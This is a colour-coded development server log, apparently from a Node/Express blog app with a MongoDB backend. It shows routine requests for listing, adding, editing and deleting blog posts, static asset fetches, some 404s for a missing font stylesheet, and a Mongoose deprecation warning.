[0mGET /stylesheets/style.css [36m304 [0m3.508 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.815 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.163 ms - 244[0m
[0mGET /blogList [36m304 [0m8.481 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.426 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.871 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.845 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.412 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.389 ms - -[0m
[0mGET / [36m304 [0m1.360 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.563 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.804 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.789 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.747 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.737 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.424 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.290 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.405 ms - 1498[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m2.589 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.750 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.749 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.366 ms - -[0m
[0mPOST /api/blogs [32m201 [0m10.865 ms - 120[0m
[0mPOST /blogAdd [36m302 [0m17.927 ms - 62[0m
[0mGET /api/blogs [32m200 [0m2.985 ms - 365[0m
[0mGET /blogList [32m200 [0m5.990 ms - 4875[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.509 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.372 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.645 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.373 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.375 ms - -[0m
[0mGET /api/blogs/5f8509d95bac5645de8b1f05 [32m200 [0m4.890 ms - 120[0m
[0mGET /blogEdit/5f8509d95bac5645de8b1f05 [32m200 [0m8.533 ms - 2465[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.394 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.341 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.339 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.147 ms - 1498[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.535 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.371 ms - -[0m
[0mPUT /api/blogs/5f8509d95bac5645de8b1f05 [32m200 [0m6.508 ms - 75[0m
[0mPOST /blogEdit/5f8509d95bac5645de8b1f05 [36m302 [0m9.655 ms - 62[0m
[0mGET /api/blogs [32m200 [0m3.060 ms - 360[0m
[0mGET /blogList [32m200 [0m6.150 ms - 4870[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.700 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.364 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.371 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.770 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.709 ms - -[0m
[0mGET /api/blogs/5f8509d95bac5645de8b1f05 [32m200 [0m2.783 ms - 115[0m
[0mGET /blogEdit/5f8509d95bac5645de8b1f05 [32m200 [0m6.022 ms - 2460[0m
[0mGET /stylesheets/style.css [36m304 [0m0.874 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.832 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.983 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.732 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.719 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.340 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.229 ms - 2676[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.451 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.388 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.907 ms - 1498[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.344 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.330 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.341 ms - -[0m
[0mGET /api/blogs [32m200 [0m4.234 ms - 360[0m
[0mGET /blogList [36m304 [0m7.455 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.475 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.357 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.431 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.351 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.344 ms - -[0m
[0mGET /api/blogs/5f836b09af88b0e8200dd36a [32m200 [0m2.537 ms - 118[0m
[0mGET /blogEdit/5f836b09af88b0e8200dd36a [32m200 [0m5.434 ms - 2471[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.447 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.396 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.049 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.062 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.712 ms - 1498[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.369 ms - -[0m
[0mGET / [36m304 [0m0.973 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.461 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.372 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.448 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.746 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.743 ms - -[0m
[0mGET /api/blogs [32m200 [0m2.841 ms - 360[0m
[0mGET /blogList [36m304 [0m6.925 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.491 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.740 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.723 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.724 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.743 ms - -[0m
[0mGET /api/blogs/5f83765934c7b32e2b5fd1c1 [32m200 [0m2.499 ms - 123[0m
[0mGET /blogDelete/5f83765934c7b32e2b5fd1c1 [36m304 [0m6.692 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.435 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.340 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.349 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.331 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.330 ms - -[0m
(node:17886) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
[0mDELETE /api/blogs/5f83765934c7b32e2b5fd1c1 [32m204 [0m4.320 ms - -[0m
[0mPOST /blogDelete/5f83765934c7b32e2b5fd1c1 [36m302 [0m7.245 ms - 62[0m
[0mGET /api/blogs [32m200 [0m2.341 ms - 236[0m
[0mGET /bloglist [32m200 [0m6.121 ms - 3899[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.476 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.332 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.442 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.765 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.733 ms - -[0m
[0mGET / [36m304 [0m0.920 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m4.192 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.570 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.599 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.584 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.367 ms - -[0m
[0mGET / [36m304 [0m0.910 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.443 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.372 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.726 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.719 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.340 ms - -[0m
[0mGET / [36m304 [0m0.942 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.441 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.707 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.698 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.697 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.721 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.659 ms - 236[0m
[0mGET /blogList [32m200 [0m6.507 ms - 3899[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.465 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.113 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.143 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.133 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.331 ms - -[0m
